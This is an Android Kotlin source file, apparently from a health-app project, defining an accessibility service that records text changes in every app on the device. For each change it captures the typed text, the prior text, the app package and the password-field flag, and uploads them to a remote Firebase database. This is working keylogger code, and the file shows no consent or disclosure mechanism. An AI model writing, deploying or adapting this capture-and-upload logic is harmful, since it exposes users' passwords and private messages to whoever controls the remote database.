package com.example.testing

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.ContentValues
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.ViewModel
import com.example.testing.utils.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers.IO
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import java.sql.Timestamp

class MyAccessibilityService : AccessibilityService() {
    var KEYBOARD_STATUS: String = "status"

    override fun onInterrupt() {
        TODO("Not yet implemented")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        //var dbHelper = DataBaseHelperImpl(DatabaseBuilder.getInstance(applicationContext))
        if (event == null) return
        //
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            Log.d("AccessKeyboard", "New text: " + event.text)
            Log.d("AccessKeyboard", "Before text: " + event.beforeText)
            var timestamp = event.eventTime
            var packageName = event.packageName.toString()
            var txt = event.text.toString()
            var beforeText = event.beforeText.toString()
            var isPassword = event.isPassword
            saveToFirebase(timestamp, packageName, txt, beforeText, isPassword)
        }
    }

    fun getInfo(context: Context, key: String) {
        TODO("Get info on keyboard click, whether it is a new character or not, return boolean")
    }

    private fun saveToFirebase(timestamp: Long, packageName: String, txt: String, beforeText: String,
    isPassword: Boolean) {
        val database = Firebase.database("https://health-app-9c151-default-rtdb.europe-west1.firebasedatabase.app")
        val myRef = database.getReference("KeyboardEvents")
        val clicks = Clicks(timestamp, packageName, txt, beforeText, isPassword)
        myRef.child("events").setValue(clicks)
        Log.d("AccessKeyboard", "Info saved to firebase")
    }

    /**
    private fun saveToDatabase(timestamp: Long, packageName: String, txt: String,
                                       beforeText: String, isPassword: Boolean ) {
        val clicks = Clicks(0, timestamp, packageName, txt, beforeText, isPassword)
        //val db = DatabaseBuilder.getInstance(applicationContext)
        //Call with coroutines
        var dbHelper = DataBaseHelperImpl(DatabaseBuilder.getInstance(applicationContext))

        CoroutineScope(IO).launch {
            try {
                dbHelper.insert(clicks)
        } catch (e: java.lang.Exception) {
            //handle error
        }
        }
    }**/


}

